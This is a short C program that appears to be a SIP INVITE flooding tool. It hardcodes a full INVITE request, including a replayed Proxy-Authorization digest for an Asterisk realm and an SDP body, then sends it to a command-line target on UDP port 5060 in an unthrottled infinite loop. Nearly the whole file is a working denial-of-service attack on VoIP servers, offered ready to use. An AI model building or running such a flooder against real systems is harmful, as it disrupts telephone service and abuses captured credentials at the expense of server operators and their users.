#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#define BUFFSIZE 1024


void Die(char *mess) { perror(mess); exit(1); }

char * message = "INVITE sip:600@192.168.0.100 SIP/2.0\n"
"Via: SIP/2.0/UDP 192.168.0.187:5060;rport;branch=z9hG4bKPjc4A9snWPIdWhpWDT2NumokGGPZ9tejcn\n"
"Max-Forwards: 70\n"
"From: sip:2000@192.168.0.100;tag=yxF6j6K5ubtVwGYLE3naOBc6Cj5awUJl\n"
"To: sip:600@192.168.0.100\n"
"Contact: <sip:2000@192.168.0.187:5060>\n"
"Call-ID: yaU3GwzDQ-qnDNT78iuhtnnXDWKSbLNg\n"
"CSeq: 29473 INVITE\n"
"Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, SUBSCRIBE, NOTIFY, REFER, MESSAGE, OPTIONS\n"
"Supported: replaces, 100rel, timer, norefersub\n"
"Session-Expires: 1800\n"
"Min-SE: 90\n"
"User-Agent: Siphon PjSip v1.4-trunk/arm-apple-darwin9\n"
"Proxy-Authorization: Digest username=\"test\", realm=\"asterisk\", nonce=\"5f04808d\", uri=\"sip:600@192.168.0.100\", response=\"8451225d5ca7b880199050c7024b68e9\", algorithm=MD5\n"
"Content-Type: application/sdp\n"
"Content-Length:   267\n"
"\n"
"v=0\n"
"o=- 3505659725 3505659725 IN IP4 192.168.0.187\n"
"s=pjmedia\n"
"c=IN IP4 192.168.0.187\n"
"t=0 0\n"
"a=X-nat:0\n"
"m=audio 4000 RTP/AVP 3 0 8 101\n"
"a=rtpmap:3 GSM/8000\n"
"a=rtpmap:0 PCMU/8000\n"
"a=rtpmap:8 PCMA/8000\n"
"a=sendrecv\n"
"a=rtpmap:101 telephone-event/8000\n"
"a=fmtp:101 0-15\n";
  

char *port = "5060";   /* SIP PORT */

  int main(int argc, char *argv[]) {
            int sock;
            struct sockaddr_in sipserver;
            struct sockaddr_in sipclient;
            char buffer[BUFFSIZE];
            unsigned int siplen, clientlen;
            int received = 0;
            char sipmsg;
            if (argc != 2) {
              fprintf(stderr, "Incorrect Arguments. Please use: %s <server_ip>\n", argv[0]);
              exit(1);
            }
           /* Create the UDP socket */
            if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
              Die("Failed to create socket");
            }
            /* Construct the server sockaddr_in structure */
            memset(&sipserver, 0, sizeof(sipserver));       /* zero out the structure */
            sipserver.sin_family = AF_INET;                  /* Internet/IP */
            sipserver.sin_addr.s_addr = inet_addr(argv[1]);  /* CLI passed IP address */
            sipserver.sin_port = htons(atoi(port));       /* server port hard coded for SIP */

  /* Build a continuous loop to send the message to the far end */
 while(1){
          siplen = strlen(message);
          if (sendto(sock, message, siplen, 0,
                     (struct sockaddr *) &sipserver,
                     sizeof(sipserver)) != siplen) {
            Die("Mismatch in number of sent bytes");
          }
      }
}

